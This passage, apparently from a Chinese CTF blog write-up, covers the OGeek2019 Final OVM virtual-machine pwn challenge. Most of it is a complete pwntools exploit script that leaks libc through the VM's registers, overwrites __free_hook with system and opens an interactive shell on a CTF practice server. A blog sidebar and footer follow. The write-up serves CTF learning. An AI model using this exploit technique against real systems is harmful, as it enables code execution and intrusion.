+<p><strong>这里比较巧妙，我们让comment[0]指向__free_hook-8，这样一来，comment[1]就会指向__free_hook的地址，那么我们最后输入的时候，输入<code>/bin/sh\00+p64(system_addr)</code>即可覆盖并传参。</strong></p>
+<h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"><span class="comment">#context.terminal = ['tmux','sp','-h']</span></span><br><span class="line">io = remote(<span class="string">'node3.buuoj.cn'</span>, <span class="number">27841</span>)</span><br><span class="line"><span class="comment">#io = process('./ovm')</span></span><br><span class="line"></span><br><span class="line">opcode = []</span><br><span class="line"></span><br><span class="line"><span class="comment"># 只能set 1字节</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">set_byte_reg</span><span class="params">(reg_index, data)</span>:</span></span><br><span class="line">    opcode.append(u32((p8(<span class="number">0x10</span>)+p8(reg_index)+p8(<span class="number">0xff</span>)+p8(data))[::<span class="number">-1</span>]))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add_reg1_reg2</span><span class="params">(res,a,b)</span>:</span></span><br><span class="line">    opcode.append(u32((p8(<span class="number">0x70</span>)+p8(res)+p8(a)+p8(b))[::<span class="number">-1</span>]))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sub_reg1_reg2</span><span class="params">(res,a,b)</span>:</span></span><br><span class="line">    opcode.append(u32((p8(<span class="number">0x80</span>)+p8(res)+p8(a)+p8(b))[::<span class="number">-1</span>]))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">left_reg1_reg2</span><span class="params">(res,a,b)</span>:</span></span><br><span class="line">    opcode.append(u32((p8(<span class="number">0xC0</span>)+p8(res)+p8(a)+p8(b))[::<span class="number">-1</span>]))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">right_reg1_reg2</span><span class="params">(res,a,b)</span>:</span></span><br><span class="line">    opcode.append(u32((p8(<span class="number">0xD0</span>)+p8(res)+p8(a)+p8(b))[::<span class="number">-1</span>]))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">mv_reg_opcode</span><span class="params">(reg_index, op_reg_index)</span>:</span></span><br><span class="line">    opcode.append(u32((p8(<span class="number">0x30</span>)+p8(reg_index)+p8(<span class="number">0</span>)+p8(op_reg_index))[::<span class="number">-1</span>]))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">mv_opcode_reg</span><span class="params">(op_reg_index, reg_index)</span>:</span></span><br><span class="line">    opcode.append(u32((p8(<span class="number">0x40</span>)+p8(reg_index)+p8(<span class="number">0</span>)+p8(op_reg_index))[::<span class="number">-1</span>]))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">set_reg</span><span class="params">(reg_index,data)</span>:</span></span><br><span class="line">    set_byte_reg(reg_index,<span class="number">0</span>)</span><br><span class="line">    set_byte_reg(<span class="number">7</span>,<span class="number">24</span>)</span><br><span class="line">    set_byte_reg(<span class="number">8</span>,<span class="number">16</span>)</span><br><span class="line">    set_byte_reg(<span class="number">9</span>,<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">    set_byte_reg(<span class="number">10</span>,(data&gt;&gt;<span class="number">24</span>))</span><br><span class="line">    set_byte_reg(<span class="number">11</span>,(data&gt;&gt;<span class="number">16</span> &amp; <span class="number">0xff</span>))</span><br><span class="line">    set_byte_reg(<span class="number">12</span>,(data&gt;&gt;<span class="number">8</span> &amp; <span class="number">0xff</span>))</span><br><span class="line">    set_byte_reg(<span class="number">14</span>,(data &amp; <span class="number">0xff</span>))</span><br><span class="line"></span><br><span class="line">    left_reg1_reg2(<span class="number">10</span>,<span class="number">10</span>,<span class="number">7</span>)</span><br><span class="line">    left_reg1_reg2(<span class="number">11</span>,<span class="number">11</span>,<span class="number">8</span>)</span><br><span class="line">    left_reg1_reg2(<span class="number">12</span>,<span class="number">12</span>,<span class="number">9</span>)</span><br><span class="line"></span><br><span class="line">    add_reg1_reg2(reg_index,reg_index,<span class="number">14</span>)</span><br><span class="line">    add_reg1_reg2(reg_index,reg_index,<span class="number">12</span>)</span><br><span class="line">    add_reg1_reg2(reg_index,reg_index,<span class="number">11</span>)</span><br><span class="line">    add_reg1_reg2(reg_index,reg_index,<span class="number">10</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show_reg</span><span class="params">()</span>:</span></span><br><span class="line">    opcode.append(<span class="number">0xff000000</span>)</span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">'../libc-2.23.so'</span>)</span><br><span class="line"><span class="comment">#libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')</span></span><br><span class="line"><span class="comment">#libc = ELF('/glibc/2.23/64/lib/libc-2.23.so')</span></span><br><span class="line">free_hook = libc.symbols[<span class="string">'__free_hook'</span>]</span><br><span class="line">system = libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">stderr = libc.symbols[<span class="string">'stderr'</span>]</span><br><span class="line">comment = <span class="number">0x0000000000202040</span></span><br><span class="line">opcode_addr = <span class="number">0x0000000000202060</span></span><br><span class="line">reg = <span class="number">0x0000000000242060</span></span><br><span class="line">stderr_got = <span class="number">0x0000000000201FF8</span></span><br><span class="line"></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">R7=24</span></span><br><span class="line"><span class="string">R8=16</span></span><br><span class="line"><span class="string">R9=8</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="comment">#R1=stderr_low</span></span><br><span class="line">set_reg(<span class="number">0</span>,<span class="number">0xffffffe6</span>)</span><br><span class="line">mv_reg_opcode(<span class="number">1</span>,<span class="number">0</span>)</span><br><span class="line"><span class="comment">#R2=stderr_high</span></span><br><span class="line">set_reg(<span class="number">0</span>,<span class="number">0xffffffe7</span>)</span><br><span class="line">mv_reg_opcode(<span class="number">2</span>,<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 计算free_hook-8,低字节存入R3,高字节存入R4</span></span><br><span class="line">set_reg(<span class="number">0</span>,free_hook-stderr<span class="number">-8</span>)</span><br><span class="line">add_reg1_reg2(<span class="number">3</span>,<span class="number">1</span>,<span class="number">0</span>)</span><br><span class="line">set_reg(<span class="number">0</span>,<span class="number">0</span>)</span><br><span class="line">add_reg1_reg2(<span class="number">4</span>,<span class="number">2</span>,<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 把free_hook-8写入comment[0]</span></span><br><span class="line">set_reg(<span class="number">0</span>,<span class="number">0xfffffff8</span>)</span><br><span class="line">mv_opcode_reg(<span class="number">0</span>,<span class="number">3</span>)</span><br><span class="line">set_reg(<span class="number">0</span>,<span class="number">0xfffffff9</span>)</span><br><span class="line">mv_opcode_reg(<span class="number">0</span>,<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">show_reg()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">'PCPC:'</span>, <span class="string">'0'</span>)</span><br><span class="line">io.sendlineafter(<span class="string">'SP:'</span>, <span class="string">'2'</span>)</span><br><span class="line">io.sendlineafter(<span class="string">'SIZE:'</span>, str(len(opcode)))</span><br><span class="line">io.recvuntil(<span class="string">'CODE:'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(opcode)):</span><br><span class="line">    io.sendline(str(opcode[i]))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">'R1: '</span>)</span><br><span class="line">low = int(io.recvuntil(<span class="string">'\n'</span>,drop=<span class="literal">True</span>),<span class="number">16</span>)</span><br><span class="line">io.recvuntil(<span class="string">'R2: '</span>)</span><br><span class="line">high = int(io.recvuntil(<span class="string">'\n'</span>,drop=<span class="literal">True</span>),<span class="number">16</span>)</span><br><span class="line"><span class="comment">#print(hex(high))</span></span><br><span class="line"><span class="comment">#print(hex(low))</span></span><br><span class="line"><span class="comment">#hex((0x7f20&lt;&lt;32)+(0x48944700))</span></span><br><span class="line">stderr_addr = (high&lt;&lt;<span class="number">32</span>)+low</span><br><span class="line"><span class="comment">#print(stderr_addr)</span></span><br><span class="line">base = stderr_addr - stderr</span><br><span class="line">system_addr = base + system</span><br><span class="line">free_hook_addr = base + free_hook</span><br><span class="line"></span><br><span class="line">low = (free_hook_addr <span class="number">-8</span>)&amp;<span class="number">0xffffffff</span></span><br><span class="line">high = ((free_hook_addr<span class="number">-8</span>)&amp;<span class="number">0xffff00000000</span>)&gt;&gt;<span class="number">32</span></span><br><span class="line"></span><br><span class="line">print(hex(free_hook_addr<span class="number">-8</span>))</span><br><span class="line"><span class="comment">#print(hex(low))</span></span><br><span class="line"><span class="comment">#print(hex(high))</span></span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">'HOW DO YOU FEEL AT OVM?\n'</span>, <span class="string">b'/bin/sh\00'</span>+p64(system_addr))</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+<h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>这次复现力求搞懂每一个细节，每一步原理，用Ex师傅的话来说，不要为了刷题而刷题。</p>
+<p>发生甚么事了？哦，断点了啊，那没事了。时间到了，该熄灯睡觉了，剩下的下次写~</p>
+<p>冲冲冲！</p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/Pwn/" rel="tag"># Pwn</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2020/11/24/%E6%A4%AD%E5%9C%86%E6%9B%B2%E7%BA%BF%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95/" rel="next" title="椭圆曲线加密算法">
+                <i class="fa fa-chevron-left"></i> 椭圆曲线加密算法
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2099/12/31/sketch-pl4ne%E3%81%AE%E6%97%A5%E8%AE%B0/" rel="prev" title="sketch_pl4neのdiary">
+                sketch_pl4neのdiary <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="/images/avatar.jpg"
+                alt="sketch_pl4ne" />
+            
+              <p class="site-author-name" itemprop="name">sketch_pl4ne</p>
+              <p class="site-description motion-element" itemprop="description">二进制QAQ</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives">
+              
+                  <span class="site-state-item-count">34</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                
+                  <span class="site-state-item-count">9</span>
+                  <span class="site-state-item-name">标签</span>
+                
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-inline">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                Links
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.zhaoj.in/" title="glzjin" target="_blank">glzjin</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://lihuaiqiu.github.io/" title="离怀秋" target="_blank">离怀秋</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.cnblogs.com/wfzWebSecuity/" title="tr1ple" target="_blank">tr1ple</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://southsea.st/" title="南溟" target="_blank">南溟</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#前言"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#VMPwn简介"><span class="nav-number">2.</span> <span class="nav-text">VMPwn简介</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#定义"><span class="nav-number">2.1.</span> <span class="nav-text">定义</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#题目特征"><span class="nav-number">2.2.</span> <span class="nav-text">题目特征</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#核心点"><span class="nav-number">2.3.</span> <span class="nav-text">核心点</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#经典例题"><span class="nav-number">2.4.</span> <span class="nav-text">经典例题</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#OGeek2019-Final-OVM"><span class="nav-number">3.</span> <span class="nav-text">[OGeek2019 Final] OVM</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#题目分析"><span class="nav-number">3.1.</span> <span class="nav-text">题目分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#解题思路"><span class="nav-number">3.2.</span> <span class="nav-text">解题思路</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#EXP"><span class="nav-number">3.3.</span> <span class="nav-text">EXP</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#小结"><span class="nav-number">4.</span> <span class="nav-text">小结</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+<div class="copyright">&copy; 2018 &mdash; <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">sketch_pl4ne</span>
+
+  
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-area-chart"></i>
+    </span>
+    
+      <span class="post-meta-item-text">Site words total count&#58;</span>
+    
+    <span title="Site words total count">44.5k</span>
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Gemini</a> v5.1.4</div>
+
+
+
+
+        
+<div class="busuanzi-count">
+  <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+  
+    <span class="site-uv">
+      <i class="fa fa-user"></i> 访客数
+      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
+      人
+    </span>
+  
+
+  
+    <span class="site-pv">
+      <i class="fa fa-eye"></i> 总访问量
+      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
+      次
+    </span>
+  
+</div>
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+          <span id="scrollpercent"><span>0</span>%</span>
+        
+      </div>
+    
+
+    
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+  
+  
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/three/three.min.js"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/three/three-waves.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+<script>
+(function(){
+    var bp = document.createElement('script');
+    var curProtocol = window.location.protocol.split(':')[0];
+    if (curProtocol === 'https') {
+        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';        
+    }
+    else {
+        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+    }
+    var s = document.getElementsByTagName("script")[0];
+    s.parentNode.insertBefore(bp, s);
+})();
+</script>
+
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
